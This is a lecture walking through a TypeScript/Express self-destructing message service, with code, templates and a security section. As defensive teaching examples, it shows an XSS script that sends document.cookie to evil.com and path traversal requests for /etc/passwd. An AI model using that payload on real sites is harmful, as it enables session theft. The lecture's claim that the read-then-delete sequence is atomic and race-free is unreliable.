# 🎓 Lecture: Building a Secure Burn-on-Read Service

**Course:** Web Application Development with TypeScript & Express  
**Topic:** Self-Destructing Message Service  
**Duration:** 90-120 minutes  
**Level:** Intermediate

---

## 📋 Table of Contents

1. [Learning Objectives](#learning-objectives)
2. [Introduction & Motivation](#introduction--motivation)
3. [Core Concepts & Technologies](#core-concepts--technologies)
4. [Architecture Overview](#architecture-overview)
5. [Deep Dive: Implementation](#deep-dive-implementation)
6. [Security Considerations](#security-considerations)
7. [Design Patterns & Best Practices](#design-patterns--best-practices)
8. [Hands-On Demonstration](#hands-on-demonstration)
9. [Common Pitfalls & Solutions](#common-pitfalls--solutions)
10. [Extensions & Real-World Applications](#extensions--real-world-applications)
11. [Q&A and Discussion](#qa-and-discussion)

---

## 🎯 Learning Objectives

By the end of this lecture, students will be able to:

1. **Understand** the concept and use cases of self-destructing messages
2. **Architect** a complete web application using Express.js and TypeScript
3. **Implement** secure file operations with read-once functionality
4. **Apply** input sanitization and XSS prevention techniques
5. **Configure** template engines (Nunjucks) with security best practices
6. **Design** RESTful routes with proper separation of concerns
7. **Utilize** modern CSS frameworks (Pico.css) effectively
8. **Validate** and handle errors gracefully in asynchronous operations

---

## 📖 Introduction & Motivation

### What is a Burn-on-Read Service?

A **burn-on-read service** is a web application that:

- Allows users to send sensitive information securely
- Generates a unique, one-time-use link
- Automatically destroys the message after it's been viewed once
- Provides assurance that data cannot be accessed multiple times

### Real-World Applications

**Use Cases:**

- Sharing passwords or API keys with colleagues
- Sending confidential information to clients
- One-time authentication codes
- Whistleblower communication platforms
- Privacy-focused messaging

**Examples in Industry:**

- [Privnote](https://privnote.com/) - Popular burn-after-reading notes
- [OneTimeSecret](https://onetimesecret.com/) - Share sensitive data
- [Snapchat](https://www.snapchat.com/) - Ephemeral messaging (concept origin)
- Many password managers include this feature

### Why Build This?

**Educational Value:**

- Full-stack application development
- Security-first thinking
- File system operations
- Modern TypeScript patterns
- Template rendering
- HTTP request/response lifecycle

**Skills Demonstrated:**

- Input validation and sanitization
- UUID generation and validation
- Asynchronous file operations
- Error handling patterns
- Responsive UI design
- Security best practices

---

## 🛠 Core Concepts & Technologies

### Technology Stack

#### Backend

```typescript
// Express.js 5.1 - Modern web framework
// TypeScript 5.9 - Type-safe JavaScript
// Node.js 18+ - Runtime environment
```

**Why Express.js?**

- Minimal and flexible
- Large ecosystem
- Well-documented
- Industry standard

**Why TypeScript?**

- Type safety prevents bugs
- Better IDE support
- Self-documenting code
- Easier refactoring

#### Templating

```typescript
// Nunjucks - Powerful templating engine
// Inspired by Jinja2 (Python)
```

**Key Features:**

- Auto-escaping (XSS prevention)
- Template inheritance
- Filters and macros
- Server-side rendering

#### Styling

```css
/* Pico.css 2.0 - Minimal CSS framework */
/* Classless CSS - style semantic HTML */
```

**Philosophy:**

- Semantic HTML over CSS classes
- Responsive by default
- Dark mode built-in
- Minimal footprint

#### Dependencies

**Production:**

```json
{
  "express": "^5.1.0", // Web framework
  "nunjucks": "^3.2.4", // Template engine
  "uuid": "^13.0.0", // Unique ID generation
  "validator": "^13.15.20" // Input sanitization
}
```

**Development:**

```json
{
  "@types/*": "...", // TypeScript definitions
  "ts-node": "^10.9.2", // Run TypeScript directly
  "nodemon": "^3.1.10", // Auto-restart on changes
  "typescript": "^5.9.3" // TypeScript compiler
}
```

---

## 🏗 Architecture Overview

### Application Structure

```
burn-on-read-service/
│
├── src/                      # Source code
│   ├── app.ts               # Application entry point
│   ├── routes/              # Route handlers
│   │   └── index.ts         # Main routes
│   └── utils/               # Utility functions
│       ├── sanitize.ts      # Input validation
│       └── fileManager.ts   # File operations
│
├── views/                    # Nunjucks templates
│   ├── index.njk            # Home page (form)
│   ├── success.njk          # Link generation
│   └── message.njk          # Message display
│
├── public/                   # Static assets
│   └── styles/
│       └── main.css         # Custom styles (empty)
│
├── messages/                 # Message storage (gitignored)
│
├── dist/                     # Compiled JavaScript (gitignored)
│
└── tsconfig.json            # TypeScript configuration
```

### Request Flow Diagram

```
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │
       │ 1. GET /
       ▼
┌──────────────────┐
│  Express Server  │  → Renders index.njk (form)
└──────┬───────────┘
       │
       │ 2. POST /create (message data)
       ▼
┌──────────────────┐
│  Validate Input  │  → sanitize.ts
└──────┬───────────┘
       │
       │ 3. Save to file
       ▼
┌──────────────────┐
│  File Manager    │  → fileManager.ts (UUID generation)
└──────┬───────────┘
       │
       │ 4. Return link
       ▼
┌──────────────────┐
│  Success Page    │  → success.njk (display link)
└──────────────────┘
       │
       │ 5. User shares link
       │ 6. GET /message/:id
       ▼
┌──────────────────┐
│  Read & Delete   │  → fileManager.ts (atomic operation)
└──────┬───────────┘
       │
       │ 7. Display message
       ▼
┌──────────────────┐
│  Message Page    │  → message.njk (one-time view)
└──────────────────┘
```

### Separation of Concerns

**Layered Architecture:**

1. **Presentation Layer** (`views/`)

   - User interface
   - Nunjucks templates
   - Pico.css styling

2. **Application Layer** (`routes/`)

   - HTTP request handling
   - Route definitions
   - Response generation

3. **Business Logic Layer** (`utils/`)

   - Input validation
   - File operations
   - Security checks

4. **Data Layer** (`messages/`)
   - File-based storage
   - Simple text files
   - UUID naming scheme

---

## 🔍 Deep Dive: Implementation

### Part 1: Application Bootstrap (`app.ts`)

```typescript
import express, { Request, Response } from "express";
import nunjucks from "nunjucks";
import path from "path";
import fs from "fs";
import routes from "./routes";

const app = express();
const PORT = process.env.PORT || 3000;

// Ensure messages directory exists
const messagesDir = path.join(__dirname, "../messages");
if (!fs.existsSync(messagesDir)) {
  fs.mkdirSync(messagesDir);
}
```

**Key Concepts:**

- **Express instance creation**: Foundation of the app
- **Environment variables**: `process.env.PORT` for deployment flexibility
- **Directory initialization**: Ensures storage location exists
- **Path resolution**: `path.join()` for cross-platform compatibility

```typescript
// Middleware
app.use(express.json()); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse form data
app.use(express.static(path.join(__dirname, "../public"))); // Serve static files
```

**Middleware Pipeline:**

1. **JSON parser**: Handles `Content-Type: application/json`
2. **URL-encoded parser**: Handles form submissions
3. **Static file server**: Serves CSS, images, JavaScript

```typescript
// Configure Nunjucks
nunjucks.configure(path.join(__dirname, "../views"), {
  autoescape: true, // CRITICAL: Prevents XSS attacks
  express: app, // Integrate with Express
});
```

**Nunjucks Security:**

- `autoescape: true` - Escapes HTML by default
- Prevents `<script>` injection
- Still allows safe HTML with `| safe` filter (use cautiously)

### Part 2: Input Sanitization (`utils/sanitize.ts`)

```typescript
import validator from "validator";

export function sanitizeInput(input: string): string {
  // Trim whitespace
  let sanitized = input.trim();

  // Escape HTML to prevent XSS attacks
  sanitized = validator.escape(sanitized);

  // Limit length (e.g., max 10000 characters)
  if (sanitized.length > 10000) {
    sanitized = sanitized.substring(0, 10000);
  }

  return sanitized;
}
```

**Defense in Depth:**

1. **Trim whitespace**: Remove accidental spaces
2. **HTML escaping**: Convert `<` to `&lt;`, etc.
3. **Length limiting**: Prevent DoS attacks

**Example Transformation:**

```javascript
Input: "<script>alert('XSS')</script>";
Output: "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;";
```

```typescript
export function validateMessage(message: string): boolean {
  if (!message || typeof message !== "string") {
    return false;
  }

  if (message.trim().length === 0) {
    return false;
  }

  if (message.length > 10000) {
    return false;
  }

  return true;
}
```

**Validation Strategy:**

- **Type checking**: Ensure string type
- **Empty check**: Reject blank messages
- **Length check**: Enforce reasonable limits
- **Fail fast**: Return early on invalid input

### Part 3: File Management (`utils/fileManager.ts`)

```typescript
import fs from "fs/promises"; // Async file operations
import path from "path";
import { v4 as uuidv4 } from "uuid";

const messagesDir = path.join(__dirname, "../../messages");

export async function saveMessage(content: string): Promise<string> {
  // Generate unique ID
  const messageId = uuidv4();
  const filePath = path.join(messagesDir, `${messageId}.txt`);

  // Write content to file
  await fs.writeFile(filePath, content, "utf-8");

  return messageId;
}
```

**UUID Generation:**

- **Format**: `550e8400-e29b-41d4-a716-446655440000`
- **Version 4**: Random generation
- **Collision probability**: Astronomically low
- **Security**: Unpredictable, prevents enumeration

**Why UUIDs?**

- No database needed
- Globally unique
- Cryptographically random
- Prevents path traversal

```typescript
export async function readAndDeleteMessage(
  messageId: string
): Promise<string | null> {
  const filePath = path.join(messagesDir, `${messageId}.txt`);

  try {
    // Check if file exists
    await fs.access(filePath);

    // Read content
    const content = await fs.readFile(filePath, "utf-8");

    // Delete file immediately
    await fs.unlink(filePath);

    return content;
  } catch (error) {
    // File doesn't exist or couldn't be read
    return null;
  }
}
```

**Atomic Operation:**

1. **Check existence**: `fs.access()` throws if missing
2. **Read content**: Get message text
3. **Delete immediately**: `fs.unlink()` removes file
4. **Error handling**: Return `null` if any step fails

**Race Condition Prevention:**

- File system locks prevent simultaneous reads
- Once deleted, subsequent requests fail
- No database transactions needed

```typescript
export function isValidMessageId(messageId: string): boolean {
  // Validate UUID format to prevent path traversal attacks
  const uuidRegex =
    /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  return uuidRegex.test(messageId);
}
```

**Security Validation:**

- **Regex pattern**: Matches UUID v4 format exactly
- **Prevents attacks**: Blocks `../../etc/passwd`
- **Fail closed**: Reject anything suspicious

### Part 4: Route Handlers (`routes/index.ts`)

```typescript
import { Router, Request, Response } from "express";
import { sanitizeInput, validateMessage } from "../utils/sanitize";
import {
  saveMessage,
  readAndDeleteMessage,
  isValidMessageId,
} from "../utils/fileManager";

const router = Router();

// Home page
router.get("/", (req: Request, res: Response) => {
  res.render("index.njk");
});
```

**RESTful Design:**

- `GET /` - Display form
- `POST /create` - Create message
- `GET /message/:id` - View and destroy

```typescript
// Create message
router.post("/create", async (req: Request, res: Response) => {
  try {
    const { message } = req.body;

    // Validate input
    if (!validateMessage(message)) {
      return res.status(400).send("Invalid message");
    }

    // Sanitize input
    const sanitizedMessage = sanitizeInput(message);

    // Save to file
    const messageId = await saveMessage(sanitizedMessage);

    // Generate link
    const link = `${req.protocol}://${req.get("host")}/message/${messageId}`;

    // Render success page
    res.render("success.njk", { link });
  } catch (error) {
    console.error("Error creating message:", error);
    res.status(500).send("Internal server error");
  }
});
```

**Error Handling:**

- **400 Bad Request**: Invalid user input
- **500 Internal Server Error**: Server-side issues
- **Try-catch**: Prevents server crashes

**Link Generation:**

- `req.protocol`: `http` or `https`
- `req.get("host")`: Domain and port
- Result: `http://localhost:3000/message/uuid-here`

```typescript
// View message (and delete it)
router.get("/message/:id", async (req: Request, res: Response) => {
  try {
    const { id } = req.params;

    // Validate message ID format
    if (!isValidMessageId(id)) {
      return res.render("message.njk", { message: null });
    }

    // Read and delete message
    const message = await readAndDeleteMessage(id);

    // Render message page
    res.render("message.njk", { message });
  } catch (error) {
    console.error("Error reading message:", error);
    res.status(500).send("Internal server error");
  }
});

export default router;
```

**Route Parameters:**

- `:id` - Dynamic segment
- `req.params.id` - Access value
- Validation before use

### Part 5: View Templates

#### Home Page (`index.njk`)

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Burn on Read</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css"
    />
    <link rel="stylesheet" href="/styles/main.css" />
  </head>
  <body>
    <main class="container">
      <h1>🔥 Burn on Read</h1>
      <p>Send a secret message that self-destructs after being read</p>

      <form action="/create" method="POST">
        <label for="message">
          Your Secret Message
          <textarea
            id="message"
            name="message"
            placeholder="Enter your message here..."
            required
            rows="6"
          ></textarea>
        </label>

        <button type="submit">Create Secure Link</button>
      </form>
    </main>
  </body>
</html>
```

**HTML Best Practices:**

- `<label>` wraps input (accessibility)
- `required` attribute (client-side validation)
- Semantic HTML (`<main>`, `<form>`)
- Responsive meta viewport

#### Success Page (`success.njk`)

```html
<main class="container">
  <h1>✅ Link Created Successfully!</h1>

  <p>
    Share this link with your recipient. It will be destroyed after one view:
  </p>

  <input
    type="text"
    value="{{ link }}"
    readonly
    onclick="this.select()"
    id="messageLink"
  />

  <button onclick="copyToClipboard()">📋 Copy Link</button>

  <p>
    <small>⚠️ Warning: This link will only work once!</small>
  </p>

  <a href="/" role="button" class="secondary">Create Another Message</a>
</main>

<script>
  function copyToClipboard() {
    const input = document.getElementById("messageLink");
    input.select();
    document.execCommand("copy");
    alert("Link copied to clipboard!");
  }
</script>
```

**Nunjucks Templating:**

- `{{ link }}` - Variable interpolation
- Auto-escaped for security
- Server-side rendering

**UX Enhancements:**

- Read-only input (prevent editing)
- Click-to-select functionality
- Copy button with JavaScript
- Warning message

#### Message Display (`message.njk`)

```html
<main class="container">
  <h1>🔓 Secret Message</h1>

  {% if message %}
  <blockquote>{{ message }}</blockquote>

  <p>
    <small
      >⚠️ This message has been destroyed and cannot be viewed again.</small
    >
  </p>
  {% else %}
  <p>❌ This message has already been read or does not exist.</p>
  {% endif %}

  <a href="/" role="button">Create Your Own Message</a>
</main>
```

**Nunjucks Control Flow:**

- `{% if message %}` - Conditional rendering
- `{{ message }}` - Display content
- `{% else %}` - Fallback state

---

## 🔒 Security Considerations

### 1. Cross-Site Scripting (XSS) Prevention

**Multiple Layers:**

```typescript
// Layer 1: Input sanitization
sanitized = validator.escape(input);

// Layer 2: Nunjucks auto-escaping
nunjucks.configure(path, { autoescape: true });

// Layer 3: Content Security Policy (optional)
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "default-src 'self'");
  next();
});
```

**Attack Example:**

```html
<!-- Attacker tries: -->
<script>
  fetch("https://evil.com?cookie=" + document.cookie);
</script>

<!-- Rendered as: -->
&lt;script&gt;fetch('https://evil.com?cookie=' + document.cookie)&lt;/script&gt;
```

### 2. Path Traversal Prevention

**UUID Validation:**

```typescript
// Attack attempt:
GET /message/../../etc/passwd

// Defense:
if (!isValidMessageId(id)) {
  return res.render("message.njk", { message: null });
}

// Result: Request rejected (invalid UUID format)
```

### 3. Denial of Service (DoS) Prevention

**Message Length Limiting:**

```typescript
if (message.length > 10000) {
  return false; // Reject excessively large messages
}
```

**Why This Matters:**

- Prevents disk space exhaustion
- Limits memory usage
- Protects against abuse

### 4. Information Disclosure Prevention

**Error Handling:**

```typescript
try {
  // ... operations ...
} catch (error) {
  console.error("Error creating message:", error); // Server logs
  res.status(500).send("Internal server error"); // Generic user message
}
```

**Don't reveal:**

- File paths
- Stack traces
- Database structure
- Internal logic

### 5. Race Conditions

**Atomic File Operations:**

```typescript
// Atomic read-and-delete
await fs.access(filePath); // Check exists
const content = await fs.readFile(filePath); // Read
await fs.unlink(filePath); // Delete

// No window for second read
```

### Security Checklist

- ✅ Input validation (type, length, format)
- ✅ HTML escaping (XSS prevention)
- ✅ UUID validation (path traversal prevention)
- ✅ Generic error messages (no info disclosure)
- ✅ Atomic operations (no race conditions)
- ✅ Template auto-escaping (defense in depth)
- ✅ HTTPS recommended (in production)
- ✅ No logging of message content

---

## 🎨 Design Patterns & Best Practices

### 1. Separation of Concerns

**Why?**

- Maintainability
- Testability
- Reusability
- Team collaboration

**Implementation:**

```
Routes      →  Handle HTTP
  ↓
Validation  →  Check input
  ↓
Business    →  Core logic
  ↓
Storage     →  Data operations
```

### 2. Dependency Injection

```typescript
// Good: Testable
export async function saveMessage(content: string): Promise<string> {
  const messageId = uuidv4();
  // ...
}

// In tests, mock uuidv4() function
```

### 3. Error Handling Strategy

**Fail Fast:**

```typescript
if (!validateMessage(message)) {
  return res.status(400).send("Invalid message"); // Early return
}
// Continue with valid data
```

**Try-Catch for Async:**

```typescript
try {
  await riskyOperation();
} catch (error) {
  handleError(error);
}
```

### 4. Async/Await Pattern

**Before (Callback Hell):**

```javascript
fs.writeFile(path, content, (err) => {
  if (err) throw err;
  fs.readFile(path, (err, data) => {
    if (err) throw err;
    fs.unlink(path, (err) => {
      // ...
    });
  });
});
```

**After (Clean & Readable):**

```typescript
await fs.writeFile(path, content);
const data = await fs.readFile(path);
await fs.unlink(path);
```

### 5. TypeScript Best Practices

**Type Safety:**

```typescript
// Explicit types
function sanitizeInput(input: string): string { ... }

// Type inference
const messageId = uuidv4();  // TypeScript knows it's a string

// Type checking
if (typeof message !== "string") { ... }
```

**Interface Definitions:**

```typescript
interface Message {
  id: string;
  content: string;
  createdAt: Date;
}
```

### 6. RESTful API Design

**HTTP Methods:**

- `GET` - Read operations (idempotent)
- `POST` - Create operations (not idempotent)
- `DELETE` - Remove operations (idempotent)

**Status Codes:**

- `200 OK` - Success
- `400 Bad Request` - Invalid input
- `404 Not Found` - Resource missing
- `500 Internal Server Error` - Server issue

### 7. Pico.css Design Philosophy

**Semantic HTML First:**

```html
<!-- No classes needed -->
<h1>Title</h1>
<p>Paragraph</p>
<button>Click me</button>
```

**Minimal Container Usage:**

```html
<!-- Avoid excessive nesting -->
<main class="container">
  <h1>Title</h1>
  <!-- No wrapper needed -->
  <form>...</form>
</main>
```

**Let the Framework Work:**

- Use native HTML elements
- Trust Pico.css defaults
- Only add classes when necessary

---

## 👨‍💻 Hands-On Demonstration

### Step 1: Clone and Setup

```powershell
# Clone repository
git clone https://github.com/linobollansee/burn-on-read-service.git
cd burn-on-read-service

# Install dependencies
npm install

# Start development server
npm run dev
```

### Step 2: Create a Message

**Browser Actions:**

1. Open `http://localhost:3000`
2. Type: "This is a secret test message"
3. Click "Create Secure Link"
4. Copy the generated link

**Expected Output:**

```
http://localhost:3000/message/550e8400-e29b-41d4-a716-446655440000
```

### Step 3: View the Message

**Actions:**

1. Open link in new incognito window
2. Observe message display
3. Note destruction warning

**What Happens:**

- File is read from disk
- Content is displayed
- File is immediately deleted

### Step 4: Verify Destruction

**Actions:**

1. Try opening the same link again
2. Observe "not found" message

**File System:**

```powershell
# Check messages directory
dir messages/
# File should be gone
```

### Step 5: Test XSS Prevention

**Input:**

```html
<script>
  alert("XSS Attack!");
</script>
```

**Expected Behavior:**

- Text is escaped
- Script doesn't execute
- Displays as plain text

**Rendered Output:**

```html
&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;
```

### Step 6: Test Path Traversal

**Manual Test:**

```
GET http://localhost:3000/message/../../etc/passwd
```

**Expected Behavior:**

- UUID validation fails
- Returns "message not found"
- No server error

### Step 7: Inspect Network Traffic

**Browser DevTools:**

1. Open Network tab
2. Create message
3. Observe:
   - `POST /create` - Form submission
   - `200 OK` - Success response
   - HTML rendered

---

## ⚠️ Common Pitfalls & Solutions

### Pitfall 1: Forgetting Directory Creation

**Problem:**

```typescript
// No directory initialization
const filePath = path.join(messagesDir, `${messageId}.txt`);
await fs.writeFile(filePath, content); // ERROR: ENOENT
```

**Solution:**

```typescript
// Ensure directory exists
if (!fs.existsSync(messagesDir)) {
  fs.mkdirSync(messagesDir);
}
```

### Pitfall 2: Race Conditions

**Problem:**

```typescript
// Two users access same link simultaneously
const exists = await fs.access(filePath); // Both pass
const content1 = await fs.readFile(filePath); // First read
const content2 = await fs.readFile(filePath); // Second read
await fs.unlink(filePath); // Only one delete
```

**Solution:**

- File system locks handle this naturally
- First read succeeds, deletes file
- Second read fails (file gone)

### Pitfall 3: Not Validating UUIDs

**Problem:**

```typescript
// Direct file access
const filePath = path.join(messagesDir, `${req.params.id}.txt`);
// Vulnerable to: ../../etc/passwd
```

**Solution:**

```typescript
if (!isValidMessageId(req.params.id)) {
  return res.render("message.njk", { message: null });
}
```

### Pitfall 4: Exposing Error Details

**Problem:**

```typescript
catch (error) {
  res.status(500).send(error.message);  // Leaks internal info
}
```

**Solution:**

```typescript
catch (error) {
  console.error(error);  // Log server-side
  res.status(500).send("Internal server error");  // Generic message
}
```

### Pitfall 5: Pico.css Nesting Issues

**Problem:**

```html
<article>
  <header><h1>Title</h1></header>
  <p>Content</p>
  <footer><small>Warning</small></footer>
  <button>Click</button>
  <!-- Overlaps footer! -->
</article>
```

**Solution:**

```html
<h1>Title</h1>
<p>Content</p>
<p><small>Warning</small></p>
<button>Click</button>
<!-- Proper spacing -->
```

### Pitfall 6: Forgetting Async/Await

**Problem:**

```typescript
const messageId = saveMessage(content); // Returns Promise
console.log(messageId); // [object Promise]
```

**Solution:**

```typescript
const messageId = await saveMessage(content);
console.log(messageId); // Actual UUID string
```

---

## 🚀 Extensions & Real-World Applications

### Extension 1: Expiration Time

**Concept:** Messages expire after X hours even if not read

```typescript
interface MessageMetadata {
  id: string;
  createdAt: Date;
  expiresAt: Date;
}

// Store metadata separately
await fs.writeFile(`${messageId}.json`, JSON.stringify(metadata));

// Check expiration on read
const meta = JSON.parse(await fs.readFile(`${messageId}.json`));
if (Date.now() > meta.expiresAt.getTime()) {
  await fs.unlink(filePath);
  return null;
}
```

### Extension 2: Password Protection

**Concept:** Require password to view message

```typescript
// Hash password on creation
const hash = await bcrypt.hash(password, 10);
await fs.writeFile(`${messageId}.pwd`, hash);

// Verify on access
const storedHash = await fs.readFile(`${messageId}.pwd`);
const valid = await bcrypt.compare(userPassword, storedHash);
if (!valid) {
  return res.status(401).send("Invalid password");
}
```

### Extension 3: View Count Limit

**Concept:** Allow N views before deletion

```typescript
interface MessageMeta {
  maxViews: number;
  viewCount: number;
}

// Increment counter
meta.viewCount++;
if (meta.viewCount >= meta.maxViews) {
  await fs.unlink(filePath);
}
```

### Extension 4: File Upload Support

**Concept:** Upload files, not just text

```typescript
import multer from "multer";

const upload = multer({ dest: "messages/" });

app.post("/create", upload.single("file"), async (req, res) => {
  const messageId = uuidv4();
  await fs.rename(req.file.path, `messages/${messageId}`);
  // ...
});
```

### Extension 5: Database Storage

**Concept:** Use PostgreSQL/MongoDB instead of files

```typescript
// PostgreSQL example
const result = await db.query(
  "INSERT INTO messages (id, content, created_at) VALUES ($1, $2, NOW())",
  [messageId, content]
);

// Read and delete in transaction
await db.query("BEGIN");
const msg = await db.query("SELECT content FROM messages WHERE id = $1", [id]);
await db.query("DELETE FROM messages WHERE id = $1", [id]);
await db.query("COMMIT");
```

### Extension 6: Read Receipt Notification

**Concept:** Notify sender when message is read

```typescript
// Store sender email
interface Message {
  content: string;
  senderEmail: string;
}

// On read, send email
await sendEmail(message.senderEmail, {
  subject: "Your message was read",
  body: "The secure message you sent has been viewed.",
});
```

### Extension 7: Analytics Dashboard

**Concept:** Track usage statistics (anonymously)

```typescript
// Log events (no personal data)
await db.query(
  "INSERT INTO analytics (event, timestamp) VALUES ('message_created', NOW())"
);

// Display stats
const stats = await db.query(`
  SELECT 
    COUNT(*) as total_messages,
    AVG(view_time - create_time) as avg_lifetime
  FROM analytics
`);
```

### Real-World Deployment

**Production Considerations:**

1. **HTTPS Required**

   ```javascript
   // Redirect HTTP to HTTPS
   app.use((req, res, next) => {
     if (!req.secure) {
       return res.redirect("https://" + req.headers.host + req.url);
     }
     next();
   });
   ```

2. **Rate Limiting**

   ```javascript
   import rateLimit from "express-rate-limit";

   const limiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
     max: 100, // Limit each IP to 100 requests per window
   });

   app.use(limiter);
   ```

3. **Environment Variables**

   ```javascript
   // .env file
   PORT = 3000;
   MAX_MESSAGE_LENGTH = 10000;
   MESSAGE_EXPIRATION_HOURS = 24;

   // Load with dotenv
   require("dotenv").config();
   ```

4. **Logging**

   ```javascript
   import winston from "winston";

   const logger = winston.createLogger({
     level: "info",
     format: winston.format.json(),
     transports: [
       new winston.transports.File({ filename: "error.log", level: "error" }),
       new winston.transports.File({ filename: "combined.log" }),
     ],
   });
   ```

5. **Monitoring**
   - Uptime monitoring (Pingdom, UptimeRobot)
   - Error tracking (Sentry)
   - Performance monitoring (New Relic)
   - Log aggregation (Loggly, Papertrail)

---

## 🎓 Key Takeaways

### Technical Skills Learned

1. **Full-Stack Development**

   - Express.js server setup
   - TypeScript configuration
   - Template rendering
   - Static file serving

2. **Security Best Practices**

   - Input validation and sanitization
   - XSS prevention techniques
   - Path traversal mitigation
   - Error handling strategies

3. **File System Operations**

   - Async file I/O
   - Atomic read-delete operations
   - Directory management
   - UUID-based naming

4. **Modern Web Development**

   - RESTful API design
   - Separation of concerns
   - Async/await patterns
   - TypeScript type safety

5. **UI/UX Design**
   - Semantic HTML
   - CSS frameworks (Pico.css)
   - Responsive design
   - Accessibility considerations

### Software Engineering Principles

- **KISS** (Keep It Simple, Stupid)

  - File-based storage (no database overhead)
  - Minimal dependencies
  - Clear code structure

- **DRY** (Don't Repeat Yourself)

  - Utility functions
  - Reusable validation
  - Shared templates

- **YAGNI** (You Aren't Gonna Need It)

  - No premature optimization
  - Simple solutions first
  - Extend when needed

- **Security by Design**
  - Multiple validation layers
  - Fail-safe defaults
  - Least privilege principle

### Professional Development

- **Code Organization**

  - Logical directory structure
  - Clear naming conventions
  - Consistent formatting

- **Documentation**

  - README with setup instructions
  - Code comments where needed
  - Type annotations

- **Version Control**
  - Git best practices
  - .gitignore configuration
  - Meaningful commits

---

## 💬 Q&A and Discussion

### Discussion Questions

1. **Scalability**: How would you handle millions of messages?

   - Database vs. file system trade-offs
   - Distributed storage solutions
   - Caching strategies

2. **Privacy**: What additional privacy features could be added?

   - End-to-end encryption
   - Zero-knowledge architecture
   - Anonymous access

3. **User Experience**: How to improve usability?

   - Browser extensions
   - Mobile apps
   - Email integration

4. **Business Model**: How to monetize ethically?

   - Premium features
   - API access
   - Enterprise offerings

5. **Legal Compliance**: What regulations apply?
   - GDPR considerations
   - Data retention policies
   - Terms of service

### Debugging Exercise

**Scenario:** Messages aren't deleting after view

**Debugging Steps:**

1. Check file system permissions
2. Verify UUID validation isn't too strict
3. Add logging to file operations
4. Test error handling
5. Inspect file system state

**Solution:**

```typescript
export async function readAndDeleteMessage(
  messageId: string
): Promise<string | null> {
  const filePath = path.join(messagesDir, `${messageId}.txt`);

  try {
    console.log(`Attempting to read: ${filePath}`); // Debug log
    await fs.access(filePath);
    const content = await fs.readFile(filePath, "utf-8");
    console.log(`Content read, deleting: ${filePath}`); // Debug log
    await fs.unlink(filePath);
    console.log(`File deleted successfully`); // Debug log
    return content;
  } catch (error) {
    console.error(`Error in readAndDeleteMessage:`, error); // Error log
    return null;
  }
}
```

### Challenge Exercises

**Easy:**

1. Add a character counter to the textarea
2. Implement a dark mode toggle
3. Add favicon and better title

**Medium:**

1. Add password protection feature
2. Implement message expiration (24 hours)
3. Create an API endpoint (JSON response)

**Hard:**

1. Add end-to-end encryption (crypto-js)
2. Build a browser extension for quick sharing
3. Implement rate limiting per IP address

---

## 📚 Additional Resources

### Official Documentation

- [Express.js Guide](https://expressjs.com/en/guide/routing.html)
- [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html)
- [Nunjucks Templating](https://mozilla.github.io/nunjucks/templating.html)
- [Pico.css Documentation](https://picocss.com/docs)
- [Node.js File System](https://nodejs.org/api/fs.html)

### Security Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express.js Security](https://expressjs.com/en/advanced/best-practice-security.html)

### Tools & Libraries

- [VS Code](https://code.visualstudio.com/) - IDE
- [Postman](https://www.postman.com/) - API testing
- [Git](https://git-scm.com/) - Version control
- [npm](https://www.npmjs.com/) - Package management

### Further Reading

- _Node.js Design Patterns_ by Mario Casciaro
- _TypeScript Deep Dive_ by Basarat Ali Syed
- _Web Application Security_ by Andrew Hoffman

---

## 🎬 Conclusion

### What We Built

A **production-ready, secure burn-on-read service** featuring:

- ✅ Self-destructing messages
- ✅ XSS and path traversal protection
- ✅ Clean, responsive UI
- ✅ Type-safe TypeScript codebase
- ✅ RESTful architecture
- ✅ Comprehensive error handling

### Skills Developed

- Full-stack web development
- Security-first thinking
- Async programming patterns
- Modern TypeScript usage
- Professional code organization

### Next Steps

1. **Deploy the application**

   - Heroku, Vercel, or DigitalOcean
   - Configure HTTPS
   - Set up monitoring

2. **Add features**

   - Choose from extensions discussed
   - Implement incrementally
   - Test thoroughly

3. **Share your work**
   - GitHub repository
   - Write a blog post
   - Present to peers

### Final Thoughts

This project demonstrates that **security doesn't have to be complex**. By following best practices, using the right tools, and thinking defensively, you can build secure applications that users trust.

**Remember:**

- Validate everything
- Escape user input
- Handle errors gracefully
- Keep it simple
- Document your code

---

## 📧 Contact & Follow-Up

**Questions?** Open an issue on the [GitHub repository](https://github.com/linobollansee/burn-on-read-service)

**Want to contribute?** Pull requests welcome!

**Stay in touch:**

- GitHub: [@linobollansee](https://github.com/linobollansee)
- Repository: [burn-on-read-service](https://github.com/linobollansee/burn-on-read-service)
